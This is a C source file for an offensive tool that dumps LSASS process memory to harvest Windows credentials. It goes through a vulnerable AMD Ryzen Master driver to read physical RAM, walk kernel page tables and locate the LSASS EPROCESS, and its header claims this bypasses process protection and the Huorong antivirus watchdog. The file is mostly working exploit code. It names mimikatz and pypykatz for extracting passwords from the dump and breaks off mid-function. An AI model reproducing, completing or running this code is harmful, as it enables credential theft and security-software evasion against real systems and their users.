/*
 * lsass_dump.c — LSASS Physical Memory Dumper
 *
 * Dumps LSASS process memory via AMD Ryzen Master driver physical R/W.
 * NO OpenProcess. NO PPL interaction. NO OB callbacks.
 * Reads directly from DRAM via page table walk → Huorong watchdog irrelevant.
 *
 * Output: lsass.dmp — standard Windows MiniDump (Memory64ListStream)
 *
 * Parse with:
 *   pypykatz lsa minidump lsass.dmp
 *   mimikatz: sekurlsa::minidump lsass.dmp
 *             sekurlsa::logonpasswords
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o lsass_dump.exe lsass_dump.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* ══════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type; uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3 && type!=8) || vd<20) continue;
        buf = (uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd) == ERROR_SUCCESS) { sz=vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz<20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
    for (DWORD i = 0; i<cnt && g_nranges<MAX_RANGES; i++, p+=20) {
        if (p+20 > buf+sz || p[0]!=3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i = 0; i<g_nranges; i++)
        if (pa >= g_ranges[i].base && pa+sz <= g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

#define IO_BUFSZ (4096 + 12)
static uint8_t g_io_buf[IO_BUFSZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in = pa; *(uint32_t*)(in+8) = sz;
    uint32_t osz = 12+sz;
    uint8_t *out; void *dyn = NULL;
    if (osz <= IO_BUFSZ) out = g_io_buf;
    else { dyn = malloc(osz); if (!dyn) return 0; out = (uint8_t*)dyn; }
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ, in, 12, out, osz, &got, NULL);
    if (ok && got >= 12) memcpy(buf, out+12, sz);
    free(dyn);
    return ok && got >= 12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) return 0;
    uint32_t isz = 12+sz;
    uint8_t *in = (uint8_t*)malloc(isz); if (!in) return 0;
    *(uint64_t*)in = pa; *(uint32_t*)(in+8) = sz;
    memcpy(in+12, data, sz);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, in, isz, NULL, 0, &got, NULL);
    free(in);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §2  KERNEL CR3 + VA→PA (for EPROCESS scan via kernel page tables)
 * ══════════════════════════════════════════════════════════════════════ */

static uint64_t g_kernel_cr3 = 0;

/* Walk page tables for a given CR3 — used by kva_to_pa and validation */
static uint64_t cr3_walk(uint64_t cr3, uint64_t va)
{
    uint64_t i4=(va>>39)&0x1FF, i3=(va>>30)&0x1FF, i2=(va>>21)&0x1FF, i1=(va>>12)&0x1FF;
    uint64_t e = 0;
    if (!phys_read(cr3 + i4*8, &e, 8) || !(e&1)) return 0;
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+i3*8,&e,8)||!(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF);
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+i2*8,&e,8)||!(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+i1*8,&e,8)||!(e&1)) return 0;
    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
}

static uint64_t kva_to_pa(uint64_t va)
{
    return g_kernel_cr3 ? cr3_walk(g_kernel_cr3, va) : 0;
}

/* Find the FULL kernel CR3 (maps all of kernel space).
 *
 * KPTI problem: Win10 1803+ has TWO PML4 tables per process:
 *   - UserCR3 (shadow): only user space + syscall stubs. May have self-ref
 *     at slot 0x1ED, fooling the standard detection. kva_to_pa for ntoskrnl
 *     would FAIL on this CR3.
 *   - KernelCR3 (full): maps everything. Self-ref at randomised slot 0x100-0x1FF.
 *
 * Fix: after finding a self-ref candidate, VALIDATE it by checking that the
 * PML4 entry for the ntoskrnl PML4 index (bits [47:39] of ntoskrnl_va) is
 * present.  A UserCR3/shadow will NOT have this entry → we skip it.
 *
 * ntoskrnl_va is passed in for validation (0 = skip validation, accept first). */
static uint64_t find_kernel_cr3(uint64_t ntoskrnl_va)
{
    /* PML4 index for ntoskrnl: used to validate the candidate CR3. */
    uint32_t nt_pml4i = ntoskrnl_va ? (uint32_t)((ntoskrnl_va >> 39) & 0x1FF) : 0;

    static uint8_t pg[4096];

    /* Pass 1: self-ref at slot 0x1ED (Win10 pre-1703 style) */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x10000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x10000000ULL) re = 0x10000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            uint64_t e = 0;
            if (!phys_read(pa+0x1ED*8, &e, 8)) continue;
            if (!((e&1) && (e&0x000FFFFFFFFFF000ULL)==pa)) continue;
            /* Validate: kernel CR3 must map ntoskrnl's PML4 range */
            if (nt_pml4i) {
                uint64_t ke = 0;
                if (!phys_read(pa + nt_pml4i*8, &ke, 8) || !(ke&1)) continue;
            }
            return pa;
        }
    }

    /* Pass 2: randomised self-ref slot (Win10 1703+ / Win11 22H2+).
     * Search first 64 MB only — early-boot allocations always live there. */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x4000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x4000000ULL) re = 0x4000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;
            for (int idx = 0x100; idx < 0x200; idx++) {
                uint64_t e = *(uint64_t*)(pg + idx*8);
                if (!(e&1)) continue;
                if ((e&0x000FFFFFFFFFF000ULL) != pa) continue;
                if (nt_pml4i) {
                    uint64_t ke = *(uint64_t*)(pg + nt_pml4i*8);
                    if (!(ke&1)) continue;   /* UserCR3 lacks ntoskrnl entry */
                }
                return pa;
            }
        }
    }

    /* Pass 3: last resort — accept any self-ref without ntoskrnl validation
     * (e.g. if ntoskrnl_va not yet known) */
    if (!ntoskrnl_va) return 0;
    return find_kernel_cr3(0);
}

/* ══════════════════════════════════════════════════════════════════════
 * §3  LSASS EPROCESS SCAN
 *
 * Two methods (in order of reliability):
 *   Method A — Kernel list walk:  PsInitialSystemProcess → ActiveProcessLinks
 *              Fast (~1ms), no brute-force, works on all Win10/11 builds.
 *   Method B — Physical RAM scan: brute-force 8-byte-aligned EPROCESS search.
 *              Fallback when kernel CR3 or export walk fails.
 * ══════════════════════════════════════════════════════════════════════ */

/* EP offsets stable across all x64 Windows builds */
#define EP_OFF_DTB   0x028u   /* Pcb.DirectoryTableBase — always at +0x28 */

/* Multi-version EPROCESS layout table.
 * Win10 1507-1803 moved UniqueProcessId + ImageFileName; 1903+ stabilized.
 * We try all candidates → the one where candidate+off_pid == lsass_pid wins. */
typedef struct {
    uint32_t off_name;  /* ImageFileName  */
    uint32_t off_pid;   /* UniqueProcessId */
    uint32_t off_flink; /* ActiveProcessLinks.Flink */
    uint32_t off_token; /* Token */
    uint32_t read_sz;   /* bytes to read from EPROCESS base */
    const char *label;
} EpLayout;

static const EpLayout g_ep_layouts[] = {
    /* Win11 24H2+ (build 26100+) — EPROCESS fully reorganised */
    { 0x338, 0x1D0, 0x1D8, 0x248, 0x360, "Win11-24H2+ (build 26100+)" },
    /* Win10 1903+ / Win11 21H2–23H2 (pre-24H2) */
    { 0x5A8, 0x440, 0x448, 0x4B8, 0x5C0, "Win10-1903+ / Win11-23H2"   },
    /* Win10 1903+ variant — ImageFileName at 0x5B8 (some builds) */
    { 0x5B8, 0x440, 0x448, 0x4B8, 0x5D0, "Win10/Win11 name@0x5B8"     },
    /* Win10 1709 / 1803 / 1809 */
    { 0x450, 0x2E8, 0x2F0, 0x358, 0x470, "Win10-1709/1803/1809"       },
    /* Win10 1607 */
    { 0x438, 0x2E0, 0x2E8, 0x348, 0x458, "Win10-1607"                 },
    /* Win10 1507 / 1511 */
    { 0x430, 0x2E0, 0x2E8, 0x348, 0x450, "Win10-1507/1511"            },
    { 0, 0, 0, 0, 0, NULL }
};

/* Working layout selected by find_eprocess; used by page-table walk */
static const EpLayout *g_epl = &g_ep_layouts[0];

static void enable_debug_privilege(void)
{
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &token)) return;
    TOKEN_PRIVILEGES tp = {1};
    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid))
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &tp, sizeof tp, NULL, NULL);
    CloseHandle(token);
}

static uint32_t lsass_get_pid(void)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe32 = {sizeof pe32};
    uint32_t pid = 0;
    if (Process32First(snap, &pe32)) do {
        if (_stricmp(pe32.szExeFile, "lsass.exe") == 0) { pid = pe32.th32ProcessID; break; }
    } while (Process32Next(snap, &pe32));
    CloseHandle(snap);
    return pid;
}

/* ── PE export RVA lookup (needed for PsInitialSystemProcess) ─────── */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if (fsz < 0x100 || pe[0]!='M' || pe[1]!='Z') return 0;
    int32_t elf = *(int32_t*)(pe+0x3C);
    if (elf<=0 || (uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns  = *(uint16_t*)(pe+elf+6);
    uint16_t osz = *(uint16_t*)(pe+elf+20);
    uint32_t sb  = (uint32_t)elf+24+osz;
    /* RVA→file-offset helper */
    #define _R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
          uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
          uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
          uint32_t _fo=*(uint32_t*)(pe+_s+20);\
          if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}}while(0)
    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; _R2F(erva,efo);
    if (!efo || efo+40>fsz) return 0;
    const uint8_t *exp = pe+efo;
    uint32_t nn  = *(uint32_t*)(exp+0x18);
    uint32_t rfn = *(uint32_t*)(exp+0x1C);
    uint32_t rnm = *(uint32_t*)(exp+0x20);
    uint32_t rod = *(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0;
    _R2F(rfn,ffn); _R2F(rnm,fnm); _R2F(rod,fod);
    if (!ffn||!fnm||!fod) return 0;
    for (uint32_t i = 0; i < nn; i++) {
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; _R2F(nrva,nfo);
        if (!nfo||nfo>=fsz) continue;
        if (strcmp((char*)(pe+nfo), sym)==0) {
            uint16_t ord = *(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef _R2F
    return 0;
}

/* ── Method A: kernel list walk ──────────────────────────────────── */
static uint64_t eproc_via_list_walk(uint32_t target_pid)
{
    if (!g_kernel_cr3) { printf("    no kernel CR3\n"); return 0; }

    typedef NTSTATUS(NTAPI*PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
    PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!fn) { printf("    NtQuerySystemInformation not found\n"); return 0; }

    typedef struct {
        HANDLE Section; PVOID MappedBase, ImageBase;
        ULONG  ImageSize, Flags;
        USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
        CHAR   FullPathName[256];
    } MOD_ENTRY;
    typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

    ULONG sz = 0x80000; MOD_LIST *ml = NULL; NTSTATUS st;
    do { free(ml); ml = (MOD_LIST*)malloc(sz*=2);
         st = fn(11, ml, sz, NULL); } while (st == (NTSTATUS)0xC0000004L);
    if (st) {
        printf("    NtQuerySI(11) failed: 0x%08X\n", (unsigned)st);
        free(ml); return 0;
    }

    uint64_t nt_va = 0; char nt_path[260] = {0};
    for (ULONG i = 0; i < ml->NumberOfModules; i++) {
        const char *fn2 = ml->Modules[i].FullPathName
                        + ml->Modules[i].OffsetToFileName;
        if (_stricmp(fn2,"ntoskrnl.exe")==0 || _stricmp(fn2,"ntkrnlmp.exe")==0) {
            nt_va = (uint64_t)ml->Modules[i].ImageBase;
            const char *p = ml->Modules[i].FullPathName;
            if (_strnicmp(p, "\\SystemRoot\\", 12)==0) {
                GetWindowsDirectoryA(nt_path, sizeof nt_path);
                strncat(nt_path, p+11, sizeof(nt_path)-strlen(nt_path)-1);
            } else
                strncpy(nt_path, p, sizeof(nt_path)-1);
            break;
        }
    }
    free(ml);

    if (!nt_va) { printf("    ntoskrnl not in module list (ImageBase=0?)\n"); return 0; }
    printf("    ntoskrnl VA=0x%llX  path=%s\n",
           (unsigned long long)nt_va, nt_path);

    HANDLE fh = CreateFileA(nt_path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (fh == INVALID_HANDLE_VALUE) {
        printf("    Cannot open ntoskrnl disk file (err=%lu)\n", GetLastError());
        return 0;
    }
    DWORD pe_sz = GetFileSize(fh, NULL);
    uint8_t *pe_buf = (uint8_t*)malloc(pe_sz); DWORD rd = 0;
    ReadFile(fh, pe_buf, pe_sz, &rd, NULL); CloseHandle(fh);
    if (rd != pe_sz) { free(pe_buf); printf("    ReadFile partial\n"); return 0; }

    uint32_t rva = pe_export_rva(pe_buf, pe_sz, "PsInitialSystemProcess");
    free(pe_buf);
    if (!rva) { printf("    PsInitialSystemProcess export not found in disk PE\n"); return 0; }
    printf("    PsInitialSystemProcess RVA=0x%X\n", rva);

    uint64_t var_pa = kva_to_pa(nt_va + rva);
    if (!var_pa) { printf("    kva_to_pa(PsInitialSystemProcess) failed\n"); return 0; }

    uint64_t sys_eproc_va = 0;
    if (!phys_read(var_pa, &sys_eproc_va, 8) || !sys_eproc_va) {
        printf("    phys_read PsInitialSystemProcess ptr failed\n"); return 0;
    }
    printf("    System EPROCESS VA=0x%llX\n", (unsigned long long)sys_eproc_va);

    /* Try each layout to find which EP_OFF_FLINK/PID is correct */
    for (int li = 0; g_ep_layouts[li].label; li++) {
        const EpLayout *L = &g_ep_layouts[li];
        uint64_t list_head_va = sys_eproc_va + L->off_flink;
        uint64_t lh_pa = kva_to_pa(list_head_va);
        if (!lh_pa) continue;
        uint64_t curr = 0;
        if (!phys_read(lh_pa, &curr, 8)) continue;
        if (!curr || curr == list_head_va) continue;

        for (int limit = 4096; limit-- && curr && curr != list_head_va; ) {
            uint64_t eproc_va = curr - L->off_flink;
            uint64_t pid_pa   = kva_to_pa(eproc_va + L->off_pid);
            if (pid_pa) {
                uint64_t pid = 0;
                phys_read(pid_pa, &pid, 8);
                if ((uint32_t)pid == target_pid) {
                    printf("    [list walk] found with layout %s\n    EPROCESS VA=0x%016llX\n",
                           L->label, (unsigned long long)eproc_va);
                    g_epl = L;
                    return eproc_va;
                }
            }
            uint64_t next_pa = kva_to_pa(curr);
            if (!next_pa || !phys_read(next_pa, &curr, 8)) break;
        }
    }
    printf("    list walk exhausted all layouts — PID %u not found\n", target_pid);
    return 0;
}

/* ── Method B: physical RAM scan — multi-version layout detection ─── */
static uint64_t eproc_via_phys_scan(uint32_t pid, uint64_t *out_cr3)
{
    /* We search for "lsass.exe\0" byte pattern directly in physical RAM.
     * For each hit, try EVERY known layout to find which offsets are correct.
     * This makes the scan version-independent across all Win10/11 builds. */
    static const uint8_t NEEDLE[] = "lsass.exe";
    static uint8_t ep_buf[0x700];  /* large enough for any layout */
    static uint8_t chunk[0x40000];
    const uint32_t CHUNK = 0x40000;
    uint64_t last_prog = 0;

    printf("  [phys scan] Scanning RAM (multi-layout, pid=%u)...\n", pid);

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t cpa = g_ranges[ri].base; cpa < end; cpa += CHUNK) {
            if (cpa - last_prog >= 0x40000000ULL) {
                printf("  [%5lluMB] ...\r", (unsigned long long)(cpa>>20));
                fflush(stdout); last_prog = cpa;
            }
            uint64_t csz = end - cpa; if (csz > CHUNK) csz = CHUNK;
            if (!phys_read(cpa, chunk, (uint32_t)csz)) continue;

            /* Scan for 'l' (first byte of "lsass.exe") — stride 1 for robustness */
            for (uint64_t off = 0; off+9 < csz; off++) {
                if (chunk[off] != 'l') continue;
                if (memcmp(chunk+off, NEEDLE, 9) != 0) continue;

                /* Found "lsass.exe\0" at physical address PA_name = cpa+off */
                uint64_t pa_name = cpa + off;

                /* Try each layout: EPROCESS base = pa_name - layout.off_name */
                for (int li = 0; g_ep_layouts[li].label; li++) {
                    const EpLayout *L = &g_ep_layouts[li];
                    if (pa_name < L->off_name) continue;
                    uint64_t epa = pa_name - L->off_name;
                    /* No pa_in_range check here — EPROCESS can straddle range
                     * boundaries. phys_read handles cross-boundary reads fine.
                     * (pa_in_range would cause false negatives at range edges.) */
                    if (!phys_read(epa, ep_buf, L->read_sz)) continue;

                    /* Verify ImageFileName at expected offset */
                    if (memcmp(ep_buf + L->off_name, NEEDLE, 9) != 0) continue;

                    /* PID check */
                    uint64_t epid = *(uint64_t*)(ep_buf + L->off_pid);
                    if (!epid || epid > 0xFFFF) continue;
                    if ((uint32_t)epid != pid) continue;

                    /* Kernel pointer guards */
                    uint64_t tok   = *(uint64_t*)(ep_buf + L->off_token);
                    uint64_t flink = *(uint64_t*)(ep_buf + L->off_flink);
                    if ((tok   & ~0xFULL) < 0xFFFF800000000000ULL) continue;
                    if (flink < 0xFFFF800000000000ULL) continue;

                    /* DTB must be a physical address — reject kernel VAs (bit 40+) */
                    uint64_t dtb = *(uint64_t*)(ep_buf + EP_OFF_DTB);
                    if (!dtb || (dtb & 0xFFF) || (dtb >> 40)) continue;

                    char name[16]={0}; memcpy(name, ep_buf+L->off_name, 15);
                    printf("\n  [phys scan] PA=0x%016llX  PID=%u  Name=%s\n"
                           "             Layout: %s  CR3=0x%016llX\n",
                           (unsigned long long)epa, (uint32_t)epid, name,
                           L->label, (unsigned long long)dtb);
                    g_epl   = L;
                    *out_cr3 = dtb;
                    return epa;
                }
            }
        }
    }
    printf("\n  [!] LSASS EPROCESS not found in any layout\n");
    return 0;
}

/* ── Unified entry point: try list walk first, then phys scan ─────── */
static uint64_t lsass_find_eprocess(uint32_t pid, uint64_t *out_cr3)
{
    /* Method A: kernel ActiveProcessLinks walk (fast, reliable) */
    printf("  [Method A] Kernel list walk...\n");
    uint64_t eproc_va = eproc_via_list_walk(pid);
    if (eproc_va) {
        uint64_t epa = kva_to_pa(eproc_va);
        if (epa) {
            uint64_t dtb = 0;
            phys_read(epa + EP_OFF_DTB, &dtb, 8);
            if (dtb && !(dtb & 0xFFF) && !(dtb >> 40)) {
                printf("  [Method A] PA=0x%016llX  CR3=0x%016llX\n",
                       (unsigned long long)epa, (unsigned long long)dtb);
                *out_cr3 = dtb;
                return epa;
            }
        }
        printf("  [Method A] VA found but PA translation failed — falling back\n");
    } else {
        printf("  [Method A] Failed — falling back to RAM scan\n");
    }

    /* Method B: brute-force physical scan */
    return eproc_via_phys_scan(pid, out_cr3);
}

/* ══════════════════════════════════════════════════════════════════════
 * §4  PAGE TABLE WALK — ENUMERATE ALL LSASS PAGES
 * ══════════════════════════════════════════════════════════════════════ */

#define MAX_PAGES 131072  /* 131072 × 4KB = 512 MB max — more than enough */

typedef struct { uint64_t va; uint64_t pa; } PageEntry;
static PageEntry g_pages[MAX_PAGES];
static int       g_npages = 0;

/* Try to find an accessible CR3 when primary CR3 page is Hyper-V SLAT-protected.
 * Probes known KPROCESS offsets for UserDirectoryTableBase (shadow CR3).
 * On KPTI systems: DTB(+0x28) = full kernel CR3 (SLAT-protected on Hyper-V).
 *                  UserDTB    = shadow user-space CR3 (often still accessible). */
static uint64_t find_accessible_cr3(uint64_t eproc_pa, uint64_t primary_cr3)
{
    static const uint32_t udtr_offsets[] = {
        0x280, 0x258, 0x260, 0x388, 0x390, 0x298, 0x2A0, 0
    };
    static uint8_t test_pml4[4096];

    for (int i = 0; udtr_offsets[i]; i++) {
        uint64_t cand = 0;
        if (!phys_read(eproc_pa + udtr_offsets[i], &cand, 8)) continue;
        if (!cand || (cand & 0xFFF) || cand == primary_cr3) continue;
        if (cand < 0x1000) continue;

        if (!phys_read(cand, test_pml4, 4096)) continue;

        /* Must have at least a few valid user-space PML4 entries */
        int valid = 0;
        for (int j = 0; j < 128; j++) {
            uint64_t e = *(uint64_t*)(test_pml4 + j*8);
            if ((e & 1) && !(e & (1ULL<<7))) valid++;
        }
        if (valid == 0) continue;

        printf("  [alt CR3] EPROCESS+0x%X = 0x%016llX  user entries=%d\n",
               udtr_offsets[i], (unsigned long long)cand, valid);
        return cand;
    }
    return 0;
}

/* Walk all 4 levels of LSASS page tables.
 * Only user-space pages (PML4 index 0..127, VA < 0x00007FFFFFFFFFFF).
 * No pa_in_range guards — Hyper-V SLAT can put page table pages outside
 * the registry-reported ranges; phys_read failure is sufficient guard.
 * Returns number of pages found. */
static int enumerate_lsass_pages(uint64_t cr3, uint64_t eproc_pa)
{
    g_npages = 0;
    static uint8_t pml4[4096], pdpt[4096], pd[4096], pt[4096];
    uint64_t active_cr3 = cr3;

    printf("  Walking LSASS page tables (CR3=0x%016llX)...\n",
           (unsigned long long)cr3);

    if (!phys_read(cr3, pml4, 4096)) {
        printf("  [!] Primary CR3 not readable (Hyper-V SLAT?)\n"
               "  [*] Trying UserDirectoryTableBase alternatives...\n");

        active_cr3 = find_accessible_cr3(eproc_pa, cr3);
        if (!active_cr3) {
            printf("  [!] No accessible CR3 found — page table walk unavailable\n");
            return 0;
        }
        if (!phys_read(active_cr3, pml4, 4096)) {
            printf("  [!] Alt CR3 also unreadable\n");
            return 0;
        }
        printf("  [+] Using alt CR3=0x%016llX\n", (unsigned long long)active_cr3);
    }

    for (int i4 = 0; i4 < 128 && g_npages < MAX_PAGES; i4++) {
        uint64_t e4 = *(uint64_t*)(pml4 + i4*8);
        if (!(e4 & 1)) continue;
        uint64_t pdpt_pa = e4 & 0x000FFFFFFFFFF000ULL;
        /* No pa_in_range — just try phys_read */
        if (!phys_read(pdpt_pa, pdpt, 4096)) continue;

        for (int i3 = 0; i3 < 512 && g_npages < MAX_PAGES; i3++) {
            uint64_t e3 = *(uint64_t*)(pdpt + i3*8);
            if (!(e3 & 1)) continue;

            if (e3 & (1ULL<<7)) {   /* 1 GB huge page */
                uint64_t base_va = ((uint64_t)i4<<39) | ((uint64_t)i3<<30);
                uint64_t base_pa = e3 & 0x000FFFFFC0000000ULL;
                for (uint64_t pg = 0; pg < 0x40000000ULL && g_npages < MAX_PAGES; pg += 0x1000) {
                    g_pages[g_npages].va = base_va + pg;
                    g_pages[g_npages].pa = base_pa + pg;
                    g_npages++;
                }
                continue;
            }

            uint64_t pd_pa = e3 & 0x000FFFFFFFFFF000ULL;
            if (!phys_read(pd_pa, pd, 4096)) continue;

            for (int i2 = 0; i2 < 512 && g_npages < MAX_PAGES; i2++) {
                uint64_t e2 = *(uint64_t*)(pd + i2*8);
                if (!(e2 & 1)) continue;

                if (e2 & (1ULL<<7)) {   /* 2 MB large page */
                    uint64_t base_va = ((uint64_t)i4<<39) | ((uint64_t)i3<<30) | ((uint64_t)i2<<21);
                    uint64_t base_pa = e2 & 0x000FFFFFFFE00000ULL;
                    for (uint64_t pg = 0; pg < 0x200000ULL && g_npages < MAX_PAGES; pg += 0x1000) {
                        g_pages[g_npages].va = base_va + pg;
                        g_pages[g_npages].pa = base_pa + pg;
                        g_npages++;
                    }
                    continue;
                }

                uint64_t pt_pa = e2 & 0x000FFFFFFFFFF000ULL;
                if (!phys_read(pt_pa, pt, 4096)) continue;

                for (int i1 = 0; i1 < 512 && g_npages < MAX_PAGES; i1++) {
                    uint64_t e1 = *(uint64_t*)(pt + i1*8);
                    if (!(e1 & 1)) continue;
                    uint64_t va = ((uint64_t)i4<<39) | ((uint64_t)i3<<30)
                                | ((uint64_t)i2<<21) | ((uint64_t)i1<<12);
                    g_pages[g_npages].va = va;
                    g_pages[g_npages].pa = e1 & 0x000FFFFFFFFFF000ULL;
                    g_npages++;
                }
            }
        }
    }

    printf("  Found %d pages (%.1f MB)\n",
           g_npages, (double)g_npages * 4096.0 / (1024*1024));
    return g_npages;
}

/* ══════════════════════════════════════════════════════════════════════
 * §5  MODULE DISCOVERY — find DLL headers in LSASS pages
 * ══════════════════════════════════════════════════════════════════════ */

#define MAX_MODULES 128

typedef struct {
    uint64_t base_va;
    uint32_t size_of_image;
    uint32_t timestamp;
    char     name[64];       /* ASCII, from PE export dir or "mod_%llX" */
} ModInfo;

static ModInfo  g_mods[MAX_MODULES];
static int      g_nmods = 0;

static void discover_modules(void)
{
    static uint8_t page[4096];
    g_nmods = 0;

    for (int i = 0; i < g_npages && g_nmods < MAX_MODULES; i++) {
        /* Only check the first page of a potential module (MZ at page start) */
        if (!phys_read(g_pages[i].pa, page, 4096)) continue;
        if (page[0] != 'M' || page[1] != 'Z') continue;

        uint32_t e_lfanew = *(uint32_t*)(page + 0x3C);
        if (e_lfanew == 0 || e_lfanew > 4096 - 0x58) continue;
        if (*(uint32_t*)(page + e_lfanew) != 0x00004550) continue;   /* PE\0\0 */

        uint16_t machine = *(uint16_t*)(page + e_lfanew + 4);
        if (machine != 0x8664) continue;  /* AMD64 only */

        uint32_t timestamp     = *(uint32_t*)(page + e_lfanew + 8);
        uint16_t opt_hdr_size  = *(uint16_t*)(page + e_lfanew + 20);
        if (opt_hdr_size < 0xF0) continue;
        uint32_t opt_off = e_lfanew + 24;
        if (opt_off + opt_hdr_size > 4096) continue;
        uint16_t magic = *(uint16_t*)(page + opt_off);
        if (magic != 0x020B) continue;  /* PE32+ */

        uint32_t size_of_image = *(uint32_t*)(page + opt_off + 56);
        if (size_of_image == 0 || size_of_image > 0x10000000) continue;

        /* Extract module name from export directory (DataDirectory[0]) */
        char name[64] = {0};
        uint32_t exp_rva  = *(uint32_t*)(page + opt_off + 112);
        uint32_t exp_size = *(uint32_t*)(page + opt_off + 116);
        if (exp_rva && exp_size >= 0x28 && exp_rva + 0x28 <= 4096) {
            uint32_t name_rva = *(uint32_t*)(page + exp_rva + 12);
            if (name_rva && name_rva + 64 <= 4096) {
                strncpy(name, (char*)(page + name_rva), 63);
                name[63] = '\0';
            }
        }
        if (!name[0]) {
            snprintf(name, sizeof name, "mod_%016llX",
                     (unsigned long long)g_pages[i].va);
        }

        /* Deduplicate by VA */
        int dup = 0;
        for (int j = 0; j < g_nmods; j++) {
            if (g_mods[j].base_va == g_pages[i].va) { dup=1; break; }
        }
        if (dup) continue;

        g_mods[g_nmods].base_va       = g_pages[i].va;
        g_mods[g_nmods].size_of_image = size_of_image;
        g_mods[g_nmods].timestamp     = timestamp;
        strncpy(g_mods[g_nmods].name, name, 63);
        g_nmods++;
    }

    printf("  Found %d modules in LSASS:\n", g_nmods);
    for (int i = 0; i < g_nmods; i++)
        printf("    0x%016llX  %s  (size=0x%X)\n",
               (unsigned long long)g_mods[i].base_va,
               g_mods[i].name,
               g_mods[i].size_of_image);
}

/* ══════════════════════════════════════════════════════════════════════
 * §6  CONTIGUOUS REGION MERGING
 * ══════════════════════════════════════════════════════════════════════ */

#define MAX_REGIONS 8192

typedef struct { uint64_t base_va; uint64_t size; int start_idx; } Region;
static Region g_regions[MAX_REGIONS];
static int    g_nregions = 0;

/* Pages must be sorted by VA (they are, since we walk PML4 in order). */
static void build_regions(void)
{
    g_nregions = 0;
